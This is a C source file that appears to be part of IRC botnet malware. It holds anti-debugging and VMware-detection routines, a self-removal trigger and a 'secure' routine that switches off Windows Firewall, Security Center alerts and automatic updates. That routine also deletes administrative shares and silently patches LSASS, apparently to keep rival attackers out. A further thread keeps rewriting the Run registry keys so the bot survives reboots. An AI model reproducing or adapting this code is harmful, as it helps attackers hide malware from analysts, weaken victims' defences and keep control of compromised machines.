

#include "bt1.h"

#ifndef NO_DEBUGCHK
//Check For Debuggers
DWORD WINAPI check_debuggers(LPVOID param)
{
	bool bPresent = FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting anti-debug check, check_debuggers()\n");
#endif

	while (1)
	{
		_asm
		{
				push eax
				mov eax, FS:[18h]
				mov eax, [eax+30h]
				movzx eax, BYTE PTR[eax+2]
				test eax, eax
				jnz DebuggerPresent
//No Debugger Present
				mov bPresent, FALSE
				jmp end
				DebuggerPresent:
//Debugger Present
				mov bPresent, TRUE
				end:
				pop eax
		}
		if (bPresent == TRUE) emergency_remove();
			Sleep(500);
	}
		ExitThread(0);
		return 0;
}
#ifndef NO_VMDETECT
//Detect WMware, ASM By tk, http://www.trapkit.de, Modified By dope
bool detect_wmw() 
{
	unsigned int a;
	__try
	{
		__asm
		{
				push eax			
				push ebx
				push ecx
				push edx
			
				mov eax, 'VMXh'
				mov ecx, 0Ah
				mov dx, 'VX'
			
				in eax, dx
			
				mov a, ebx

				pop edx
				pop ecx
				pop ebx
				pop eax
		}
	} __except (EXCEPTION_EXECUTE_HANDLER) {}
	if (a == 'VMXh') return TRUE;
	return FALSE;
}
#endif

#endif





#ifndef NO_SECURE
//Secure Bot
DWORD WINAPI secu123(LPVOID param)
{
	char szBuffer[IRCBUF], szUrl[MEDBUF];
	HKEY rk = NULL;
	if (is_os9x()) return 0;
	if (!is_osnt()) return 0;

#ifndef NO_DEBUG
		printf("[DEBUG] Securing , secu123()\n");
#endif

//Anti XP SP2 Code, BLEH
		get_os(szBuffer);
	if (strstr(szBuffer, "Windows XP Service Pack 2") != NULL)
	{
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate", "DoNotAllowXPSP2", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", "AntiVirusDisableNotify", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", "FirewallDisableNotify", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", "AntiVirusOverride", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", "FirewallOverride", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", "UpdatesDisableNotify", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update", "AUOptions", 1);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile", "EnableFirewall", 0);
			regwritedword(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile", "EnableFirewall", 0);
			regwritedword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", 4);
			regwritedword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\wscsvc", "Start", 4);
			regwritedword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\wuauserv", "Start", 4);
	}
//Disable NULL Session
		regwritedword(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "restrictanonymous", 2);
//Remove Shares
	HMODULE hMod;
	typedef DWORD (__stdcall *NSD)(LPTSTR, LPTSTR, DWORD);
	NSD fNetShareDel;
		hMod = LoadLibrary("netapi32.dll");
		fNetShareDel = (NSD)GetProcAddress(hMod, "NetShareDel");
	if (fNetShareDel != NULL)
	{
			fNetShareDel(NULL, (char *)L"Admin$", 0);
			fNetShareDel(NULL, (char *)L"C$", 0);
			fNetShareDel(NULL, (char *)L"D$", 0);
			fNetShareDel(NULL, (char *)L"E$", 0);
			fNetShareDel(NULL, (char *)L"F$", 0);
			fNetShareDel(NULL, (char *)L"G$", 0);
			fNetShareDel(NULL, (char *)L"H$", 0);
			fNetShareDel(NULL, (char *)L"I$", 0);
			fNetShareDel(NULL, (char *)L"IPC$", 0);
			fNetShareDel(NULL, (char *)L"J$", 0);
			fNetShareDel(NULL, (char *)L"K$", 0);
			fNetShareDel(NULL, (char *)L"L$", 0);
			fNetShareDel(NULL, (char *)L"M$", 0);
			fNetShareDel(NULL, (char *)L"N$", 0);
			fNetShareDel(NULL, (char *)L"O$", 0);
			fNetShareDel(NULL, (char *)L"P$", 0);
			fNetShareDel(NULL, (char *)L"Print$", 0);
			fNetShareDel(NULL, (char *)L"Q$", 0);
			fNetShareDel(NULL, (char *)L"R$", 0);
			fNetShareDel(NULL, (char *)L"S$", 0);
			fNetShareDel(NULL, (char *)L"T$", 0);
			fNetShareDel(NULL, (char *)L"U$", 0);
			fNetShareDel(NULL, (char *)L"V$", 0);
			fNetShareDel(NULL, (char *)L"W$", 0);
			fNetShareDel(NULL, (char *)L"X$", 0);
			fNetShareDel(NULL, (char *)L"Y$", 0);
			fNetShareDel(NULL, (char *)L"Z$", 0);
	}
//Disable DCOM
		regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Ole", "EnableDCOM", "N");
//Download MS04-011 Patch (LSASS)
		GetWindowsDirectory(szBuffer, sizeof(szBuffer));
		strcat(szBuffer, "\\KB835732.log");
	if (file_exists(szBuffer)) return TRUE;
		get_os(szBuffer);
	if (strstr(szBuffer, "Windows 2000") != NULL)
		sprintf(szUrl, "http://download.microsoft.com/download/f/a/a/faa796aa-399d-437a-9284-c3536e9f2e6e/Windows2000-KB835732-x86-ENU.EXE");
	else if (strstr(szBuffer, "Windows XP") != NULL)
		sprintf(szUrl, "http://download.microsoft.com/download/6/1/5/615a50e9-a508-4d67-b53c-3a43455761bf/WindowsXP-KB835732-x86-ENU.EXE");
	typedef HRESULT (__stdcall *UDTF)(DWORD, LPCSTR, LPCSTR, DWORD, DWORD);	
	char szComplete[17] = "URLDown";
		strcat(szComplete, "loadToFileA");
	HMODULE hUrl = LoadLibrary("urlmon.dll");
	UDTF fURLDownloadToFile = (UDTF)GetProcAddress(hUrl, szComplete);
	if (fURLDownloadToFile(0, szUrl, "C:\\patch.exe", 0, 0) == S_OK) ShellExecute(0, "open", "C:\\patch.exe", "/passive /quiet /norestart", NULL, SW_HIDE);
		return 0;
}
#endif
#ifndef NO_REGSECURE
//Registry Secure Thread
DWORD WINAPI registry_secure(LPVOID param)
{
	char szFilePath[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Securing registry startup, registry_secure()\n");
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));

#ifndef NO_FWB
	if (is_fwb())
	{
		char szSysDir[MAX_PATH];
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szFilePath, "%s\\%s", szSysDir, filename);
	}
#endif

#ifndef NO_INSTALL
	while (1)
	{
			regwritekey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", regkeyname, szFilePath);
			regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", regkeyname, szFilePath);
			Sleep(500);
	}
#endif

		return 0;
}
#endif